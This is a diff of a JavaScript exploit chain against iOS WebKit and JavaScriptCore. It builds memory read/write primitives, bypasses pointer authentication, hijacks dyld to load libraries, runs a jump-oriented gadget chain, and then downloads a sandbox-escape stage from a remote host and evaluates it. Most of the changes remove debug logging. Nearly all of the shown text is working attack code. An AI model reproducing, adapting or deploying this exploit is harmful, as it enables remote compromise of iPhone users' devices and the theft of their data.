@@ -37,7 +37,6 @@ function print(x, reportError = false, dumphex = false) {
       {
           let url = "";
           url = host + (fname.startsWith('/') ? fname : '/' + fname);
-          print("trying to fetch from:" + url);
           let xhr = new XMLHttpRequest();
           xhr.open("GET", `${url}` , false);
           xhr.send(null);
@@ -45,7 +44,6 @@ function print(x, reportError = false, dumphex = false) {
       }
       catch(e)
       {
-          print("got error from getJS: " + e);
       }
   }
 var p_rce = {_root: []};
@@ -8483,6 +8481,7 @@ rce_offsets = {
 var globalFuncParseFloat = 0n;
 var maximum_id = 0n;
 async function _aarw_main() {
+    print("_aarw_main() start");
 
     // util func. 
     const util = (() => {
@@ -8800,7 +8799,6 @@ async function _aarw_main() {
             for (let i = 0; i < N; ++i) {
                 try {
                     run(util, p_rce);
-                    print(`success with ${i+1} unit tries`);
                     return;
                 } catch (e) {
                     // log('retrying! ' + e);
@@ -8813,12 +8811,10 @@ async function _aarw_main() {
 
     })();
 
-    print("try aar/w");
     try {
         await _make_rw(p_rce, () => _make_stage1(util, p_rce));
         function setup_stage1_prim(p_rce)
         {
-          print("inside stage1_prim");
           function addrof(object) {
               return BigInt.fromDouble((p_rce.addrof(object)));
           }
@@ -8897,7 +8893,6 @@ async function _aarw_main() {
               return (BigInt(read64_str.charCodeAt(0))
                   | BigInt(read64_str.charCodeAt(1)) << 16n);
           }
-          print("after setting up prims");
           // Disable Worklet GC
           const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
           const heap = vm.add(0xc0n);
@@ -8909,7 +8904,6 @@ async function _aarw_main() {
             write64(ptr, value);
           };
           write8(isSafeToCollect, 0n);
-          print("after gc disable");
           const executable = read64(addrof(parseFloat) + 0x18n);
           globalFuncParseFloat = read64(executable + 0x28n).noPAC();
           const jsc_base = (function() {
@@ -8923,7 +8917,6 @@ async function _aarw_main() {
                   jsc_base -= 0x1000n;
               }
           })();
-          print("jsc_base now: " + jsc_base.hex());
           function parse_adrp(addr) {
               const x = Number(read32(addr));
               const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
@@ -9293,21 +9286,14 @@ const device_chipset = {
                   return version.split('_').map(part => parseInt(part));
               }
           })();
-          print(`ios_version: ${ios_version}`);
           const pthread_create_got = BigInt(parse_adrp_add(jsc_base + pthread_create_auth_stubs_offset[ios_version]));
-          print(`pthread_create_got: ${pthread_create_got.hex()}`);
           const pthread_create = read64(pthread_create_got).noPAC();
-          print(`pthread_create: ${pthread_create.hex()}`);
           const libsystem_pthread_base = pthread_create - pthread_create_offset[ios_version];
-          print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
           const libsystem_pthread_linkedit = read64(libsystem_pthread_base + 0x600n);
-          print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
           device_model = linkedit_to_device[ios_version][libsystem_pthread_linkedit];
-          print("device_model: " + device_model);
           chipset = device_chipset[device_model];
           offsets = rce_offsets[device_model];
           slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
-          print(`slide: ${slide.hex()}`);
           for (const key of Object.keys(offsets)) {
               if (offsets[key] >= 0x100000000n) offsets[key] += slide;
           }
@@ -9315,7 +9301,6 @@ const device_chipset = {
           write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
           const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
           const contexts_length = read32(contexts - 4n);
-          print(`contexts_lenght:${contexts_length.hex()}`);
           let worker;
 
           for (let i = 0n; i < contexts_length; ++i) {
@@ -9324,7 +9309,6 @@ const device_chipset = {
                   continue;
 
               const vtable = read64(scriptExecutionContext);
-              //print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
               if (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                   continue;
 
@@ -9335,19 +9319,16 @@ const device_chipset = {
               }
           }
 
-          print(`worker: ${worker.hex()}`);
 
           const script = read64(worker + 0x150n);
           const workerOrWorkletThread = read64(worker + 0x160n);
           const Strong_globalScopeWrapper = read64(script + 0x20n);
           const globalScopeWrapper = read64(Strong_globalScopeWrapper);
           const worker_global_butterfly = read64(globalScopeWrapper + 8n);
-          print(`butterfly:${worker_global_butterfly.hex()}`);
           const unboxed_arr = read64(worker_global_butterfly);
           const boxed_arr = read64(worker_global_butterfly + 8n);
           const butterfly = read64(boxed_arr + 8n);
           write64(unboxed_arr + 8n, butterfly);
-          print("Finished stage1 prim succesfully");
         }
         function setup_stage2_prim()
         {
@@ -9435,16 +9416,16 @@ const device_chipset = {
           globalThis.device_model = p.device_model;
           p.offsets = offsets;
           p.slide = slide;
-          print("Finished stage2 prims succesfully, rce done");
           self.postMessage({
             type: 'prepare_dlopen_workers'
           });
         }
         setup_stage1_prim(p_rce);
+        print("stage1_prim done");
         setup_stage2_prim();
+        print("stage2_prim done");
     } catch (e) {
         if (e instanceof TryAgainError) {
-            print('failed _make_rw ... retry');
         } else {
             throw e;
         }
@@ -9452,11 +9433,11 @@ const device_chipset = {
     return p_rce;
 }
 async function main() {
-    print("begin");
     try {
+        print("main() start");
         return await _aarw_main();
     } catch (e) {
-        print('_aarw_main: error: ' + e);
+        print("main() error: " + e);
     }
 }
   const rce_begin = Date.now();
@@ -9628,14 +9609,11 @@ async function main() {
     switch (data.type) {
       case 'dlopen_workers_prepared':
         {
-          print("dlopen prepared from worker");
           const {
             offsets
           } = p;
           const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
-          print(`contexts: ${contexts.hex()}`);
           const contexts_length = p.read64(contexts - 8n) >> 32n;
-          print(`contexts_length: ${contexts_length.hex()}`);
           const dlopen_workers = [];
           p.dlopen_workers = dlopen_workers;
           for (let i = 0n; i < contexts_length; ++i) {
@@ -9667,51 +9645,35 @@ async function main() {
             }
           }
           const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
-          print(`defaultLoader: ${defaultLoader.hex()}`);
           if (defaultLoader) {
             const paciza_nullfunc = p.read64(offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
-            print(`paciza_nullfunc: ${paciza_nullfunc.hex()}`);
             const dispatchSource = p.read64(defaultLoader + 0x18n);
-            print(`dispatchSource: ${dispatchSource.hex()}`);
             const dispatchSomething = p.read64(dispatchSource + 0x58n);
-            print(`dispatchSomething: ${dispatchSomething.hex()}`);
             const dispatchBlock = p.read64(dispatchSomething + 0x28n);
-            print(`dispatchBlock: ${dispatchBlock.hex()}`);
             p.write64(dispatchBlock + 0x20n, paciza_nullfunc);
           }
           const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
           for (let i = 0; i < 2; ++i) {
             const worker = dlopen_workers[i];
             const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
-            print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
             const imageBuffer = p.read64(wrappedBitmap + 0x10n);
-            print(`imageBuffer: ${imageBuffer.hex()}`);
             p.write64(imageBuffer + 0x20n, classes[i]);
           }
-          print('Load TextToSpeech');
           await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
-          print('TextToSpeech Loaded');
           const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
-          print(`NSBundleTables: ${NSBundleTables.hex()}`);
           const loadedFrameworks = p.read64(NSBundleTables + 0x20n);
-          print(`loadedFrameworks: ${loadedFrameworks.hex()}`);
           const loadedFrameworks_length = p.read64(loadedFrameworks + 0x30n);
-          print(`loadedFrameworks_length: ${loadedFrameworks_length.hex()}`);
           const loadedFrameworks_buffer = p.read64(loadedFrameworks + 8n);
-          print(`loadedFrameworks_buffer: ${loadedFrameworks_buffer.hex()}`);
           let TextToSpeech_NSBundle;
           for (let i = 0n; i < loadedFrameworks_length; ++i) {
             const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
             if (bundle <= 0x1_00000000n) continue;
-            print(`bundle[${i}]: ${bundle.hex()}`);
             const initialPath = p.read64(bundle + 0x28n);
             if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
             TextToSpeech_NSBundle = bundle;
             break;
           }
-          print(`TextToSpeech_NSBundle: ${TextToSpeech_NSBundle.hex()}`);
           const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + 0x10n);
-          print(`TextToSpeech_CFBundle: ${TextToSpeech_CFBundle.hex()}`);
           p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
           p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;
           p.write64(TextToSpeech_NSBundle + 8n, 0x40008n);
@@ -9732,28 +9694,20 @@ async function main() {
             offsets
           } = p;
           const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000011111111n);
-          print(`worker.thread: ${worker.thread.hex()}`);
           const runtimeState = p.read64(offsets.libdyld__gAPIs);
           p.runtimeState = runtimeState;
-          print(`runtimeState: ${runtimeState.hex()}`);
           const runtimeState_vtable = p.read64(runtimeState).noPAC();
-          print(`runtimeState_vtable: ${runtimeState_vtable.hex()}`);
           const dyld_emptySlot = p.read64(runtimeState_vtable).noPAC();
-          print(`dyld_emptySlot: ${dyld_emptySlot.hex()}`);
           const runtimeStateLock = p.read64(runtimeState + 0x70n);
-          print(`runtimeStateLock: ${runtimeStateLock.hex()}`);
           p.runtimeStateLock = runtimeStateLock;
           const p_InterposeTupleAll_buffer = runtimeState + 0xb8n;
           p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
           const p_InterposeTupleAll_size = runtimeState + 0xc0n;
           p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
-          print(`p_InterposeTupleAll_buffer: ${p_InterposeTupleAll_buffer.hex()}`);
           const stack_bottom = p.read64(worker.thread + 0x10n);
           worker.stack_bottom = stack_bottom;
-          print(`stack_bottom: ${stack_bottom.hex()}`);
           const stack_top = p.read64(worker.thread + 0x18n);
           worker.stack_top = stack_top;
-          print(`stack_top: ${stack_top.hex()}`);
           p.create_jsstring = function (ptr, size) {
             const res = 'a'.repeat(8);
             const str = p.read64(p.addrof(res) + 8n);
@@ -9767,36 +9721,27 @@ async function main() {
             while (true) {
               const index = finder.indexOf(needle);
               if (index != -1) {
-                print(`index:${index}`);
                 return begin + BigInt(index);
               }
             }
           };
           const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
-          print(`dyld_offset: ${dyld_offset.hex()}`);
           p.dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
-          print(`p.dlopen_from_lambda_ret: ${p.dlopen_from_lambda_ret.hex()}`);
-          print(p.read64(p.dlopen_from_lambda_ret).hex());
           u64[0] = p.dlopen_from_lambda_ret;
           const needle = [u8[0], u8[1], u8[2], u8[3]];
           const search_result = p.efficient_search(stack_top, stack_bottom, needle);
-          print(`search_result:${search_result.hex()}`);
           const loader = search_result + 0x78n;
-          print(`loader:${loader.hex()}`);
           const interposingTuples = new BigUint64Array(0x100 * 2);
           p.interposingTuples = interposingTuples;
           const interposingTuples_data_ptr = interposingTuples.data();
-          print(`interposingTuples_data_ptr:${interposingTuples_data_ptr.hex()}`);
           const prev_metadata = new BigUint64Array(4);
           const prev_metadata_data_ptr = prev_metadata.data();
           p.prev_metadata = prev_metadata;
           p.prev_metadata_data_ptr = prev_metadata_data_ptr;
-          print(`prev_metadata_data_ptr:${prev_metadata_data_ptr.hex()}`);
           prev_metadata[0] = prev_metadata_data_ptr;
           prev_metadata[1] = 1n;
           const metadata = new BigUint64Array(4);
           const metadata_data_ptr = metadata.data();
-          print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
           p.metadata1 = metadata;
           metadata[0] = prev_metadata_data_ptr;
           metadata[1] = metadata_data_ptr + 0x10n - interposingTuples_data_ptr | 1n;
@@ -9808,9 +9753,7 @@ async function main() {
           p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x10n, offsets.HOMEUI_cstring);
           p.write64(offsets.CFNetwork__gConstantCFStringValueTable + 0x18n, 0x3bn);
           p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x101n);
-          print(`going to load AVSpeechSynthesisVoice`);
           await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice);
-          print(`succeeded to load`);
           p.write64(offsets.libsystem_c__atexit_mutex + 0x20n, 0x102n);
           p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
           p.write64(p.TextToSpeech_NSBundle + 0x40n, 0n);
@@ -9829,24 +9772,17 @@ async function main() {
           const {
             offsets
           } = p;
-          print('check_dlopen2');
           const worker = p.dlopen_workers.find(worker => worker.id == 0xfffe000022222222n);
-          print(`worker.thread: ${worker.thread.hex()}`);
           const stack_bottom = p.read64(worker.thread + 0x10n);
           worker.stack_bottom = stack_bottom;
-          print(`stack_bottom: ${stack_bottom.hex()}`);
           const stack_top = p.read64(worker.thread + 0x18n);
           worker.stack_top = stack_top;
-          print(`stack_top: ${stack_top.hex()}`);
           u64[0] = p.dlopen_from_lambda_ret;
           const needle = [u8[0], u8[1], u8[2], u8[3]];
           const search_result = p.efficient_search(stack_top, stack_bottom, needle);
-          print(`search_result:${search_result.hex()}`);
           const loader = search_result + 0x78n;
-          print(`loader:${loader.hex()}`);
           const metadata = new BigUint64Array(4);
           const metadata_data_ptr = metadata.data();
-          print(`metadata_data_ptr:${metadata_data_ptr.hex()}`);
           p.metadata1 = metadata;
           metadata[0] = p.prev_metadata_data_ptr;
           metadata[1] = metadata_data_ptr + 0x10n - 0x100n | 1n;
@@ -9873,11 +9809,8 @@ async function main() {
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
           while (p.read64(p.p_InterposeTupleAll_size) != 0x100n);
-          print('InterposeTupleAll.size has been written');
           const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
-          print(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
           const paciza_PAL_initPKContact = p.read64(offsets.WebCore__PAL_getPKContactClass);
-          print(`paciza_PAL_initPKContact: ${paciza_PAL_initPKContact.hex()}`);
           p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, initMediaAccessibilityMACaptionAppearanceGetDisplayType);
           p.write64(offsets.ImageIO__gImageIOLogProc, paciza_PAL_initPKContact);
           p.write64(offsets.WebCore__initPKContact_once, 0xffffffffffffffffn);
@@ -9893,17 +9826,11 @@ async function main() {
             offsets
           } = p;
           const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
-          print(`paciza_invoker: ${paciza_invoker.hex()}`);
           const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
-          print(`paciza_security_invoker_1: ${paciza_security_invoker_1.hex()}`);
           const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
-          print(`paciza_security_invoker_2: ${paciza_security_invoker_2.hex()}`);
           const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
-          print(`paciza_dlopen: ${paciza_dlopen.hex()}`);
           const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
-          print(`paciza_dlsym: ${paciza_dlsym.hex()}`);
           const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
-          print(`paciza_signPointer: ${paciza_signPointer.hex()}`);
           const gSecurityd = new BigUint64Array(0x100 / 8);
           const gSecurityd_data_ptr = gSecurityd.data();
           p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
@@ -9976,79 +9903,48 @@ async function main() {
             return slow_fcall_1(paciza_signPointer, signPointer_self_addr, ctx, ptr);
           }
           const libsystem_pthread = await slow_dlopen('/usr/lib/system/libsystem_pthread.dylib', 1n);
-          print(`libsystem_pthread: ${libsystem_pthread.hex()}`);
           const libsystem_malloc = await slow_dlopen("/usr/lib/system/libsystem_malloc.dylib", 0n);
-          print(`libsystem_malloc: ${libsystem_malloc.hex()}`);
           const signed_pthread_create = await slow_dlsym(libsystem_pthread, 'pthread_create');
           offsets.pthread_create = signed_pthread_create.noPAC();
-          print(`signed_pthread_create: ${signed_pthread_create.hex()}`);
           const paciza_malloc = await slow_dlsym(libsystem_malloc, 'malloc');
           offsets.malloc = paciza_malloc.noPAC();
-          print(`paciza_malloc: ${paciza_malloc.hex()}`);
           const gadget_control_1 = offsets.gadget_control_1_ios184;
-          print(`gadget_control_1:${gadget_control_1.hex()}`);
           const gadget_control_2 = offsets.gadget_control_2_ios184;
-          print(`gadget_control_2:${gadget_control_2.hex()}`);
           const gadget_control_3 = offsets.gadget_control_3_ios184;
-          print(`gadget_control_3: ${gadget_control_3.hex()}`);
           const gadget_loop_1 = offsets.gadget_loop_1_ios184;
-          print(`gadget_loop_1: ${gadget_loop_1.hex()}`);
           const gadget_loop_2 = offsets.gadget_loop_2_ios184;
-          print(`gadget_loop_2: ${gadget_loop_2.hex()}`);
           const gadget_loop_3 = offsets.gadget_loop_3_ios184;
-          print(`gadget_loop_3: ${gadget_loop_3.hex()}`);
           const gadget_set_all_registers = offsets.gadget_set_all_registers_ios184;
-          print(`gadget_set_all_registers: ${gadget_set_all_registers.hex()}`);
           const paciza_gadget_loop_1 = await slow_pacia(gadget_loop_1, 0n);
-          print(`paciza_gadget_loop_1: ${paciza_gadget_loop_1.hex()}`);
           const paciza_gadget_loop_2 = await slow_pacia(gadget_loop_2, 0n);
-          print(`paciza_gadget_loop_2: ${paciza_gadget_loop_2.hex()}`);
           const paciza_gadget_loop_3 = await slow_pacia(gadget_loop_3, 0n);
-          print(`paciza_gadget_loop_3: ${paciza_gadget_loop_3.hex()}`);
           const paciza_gadget_control_2 = await slow_pacia(gadget_control_2, 0n);
-          print(`paciza_gadget_control_2: ${paciza_gadget_control_2.hex()}`);
           const paciza_gadget_control_3 = await slow_pacia(gadget_control_3, 0n);
-          print(`paciza_gadget_control_3: ${paciza_gadget_control_3.hex()}`);
           const paciza_gadget_control_3_4 = await slow_pacia(gadget_control_3 + 4n, 0n);
-          print(`paciza_gadget_control_3_4: ${paciza_gadget_control_3_4.hex()}`);
           const paciza_gadget_set_all_registers = await slow_pacia(gadget_set_all_registers, 0n);
-          print(`paciza_gadget_set_all_registers: ${paciza_gadget_set_all_registers.hex()}`);
           const jop_thread = new BigUint64Array(0x20 / 8);
           const jop_thread_data_ptr = jop_thread.data();
           const x0_u64 = new BigUint64Array(0x20 / 8);
           const x0 = x0_u64.data();
           x0_u64[8 / 8] = paciza_gadget_loop_3;
           await slow_fcall_2(signed_pthread_create, jop_thread_data_ptr, 0n, paciza_gadget_loop_3, x0);
-          print('WebContent fcall thread has been spawned!!');
           const pthread_node = jop_thread[0];
-          print(`pthread_node:${pthread_node.hex()}`);
           const jop_stack_top = p.read64(pthread_node + 0xb8n);
-          print(`jop_stack_top:${jop_stack_top.hex()}`);
           const jop_stack_bottom = jop_stack_top + 0x88000n;
-          print(`jop_stack_bottom:${jop_stack_bottom.hex()}`);
           const x19_u64 = new BigUint64Array(0x500 / 8);
           const x19_f64 = new Float64Array(x19_u64.buffer);
           const x19 = x19_u64.data();
-          print(`x19: ${x19.hex()}`);
           const x22_u64 = new BigUint64Array(0x20 / 8);
           const x22 = x22_u64.data();
-          print(`x22: ${x22.hex()}`);
           const x20_u64 = new BigUint64Array(0x30 / 8);
           const x20 = x20_u64.data();
-          print(`x20: ${x20.hex()}`);
           const stack_u64 = new BigUint64Array(0x88000 / 8);
           const stack = stack_u64.data();
-          print(`stack: ${stack.hex()}`);
           const paciza_gadget_control_1 = await slow_pacia(gadget_control_1, 0n);
-          print(`paciza_gadget_control_1: ${paciza_gadget_control_1.hex()}`);
           const pacib_gadget_loop_1_0x80020 = await slow_pacib(gadget_loop_1, stack + 0x80020n);
-          print(`pacib_gadget_loop_1_0x80020: ${pacib_gadget_loop_1_0x80020.hex()}`);
           const pacib_gadget_loop_1_0x800c0 = await slow_pacib(gadget_loop_1, stack + 0x800c0n);
-          print(`pacib_gadget_loop_1_0x800c0: ${pacib_gadget_loop_1_0x800c0.hex()}`);
           const pacib_gadget_loop_2_0x80010 = await slow_pacib(gadget_loop_2, stack + 0x80010n);
-          print(`pacib_gadget_loop_2_0x80010: ${pacib_gadget_loop_2_0x80010.hex()}`);
           const pacib_gadget_loop_2_0x800b0 = await slow_pacib(gadget_loop_2, stack + 0x800b0n);
-          print(`pacib_gadget_loop_2_0x800b0: ${pacib_gadget_loop_2_0x800b0.hex()}`);
           const MAGIC = 123.456;
           p.write64(jop_stack_bottom - 0x4fa0n, stack + 0x80000n);
           p.write64(jop_stack_bottom - 0x4f98n, await slow_pacib(gadget_loop_1, jop_stack_top + 0x83070n));
@@ -10167,14 +10063,13 @@ async function main() {
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
-                const sbx0_script = getJS('/sbx0_main_18.4.js');
+                const sbx0_script = getJS('/sbx0_main_18.4.js?' + Date.now());
                 log("after get js");
                 eval(sbx0_script);
         } catch (e) {
             log(btoa(e));
         }
           fcall_close();
-          print(`all done`);
           self.postMessage({
             type: 'redirect'
           });
@@ -10189,11 +10084,9 @@ async function main() {
         {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
-            print("inside stage1_rce from worker");
             main().then((p_temp) => {
               if(!p_temp.addrof)
               {
-                print("Failed rce, retrying if possible");
                 main();
               }
             });
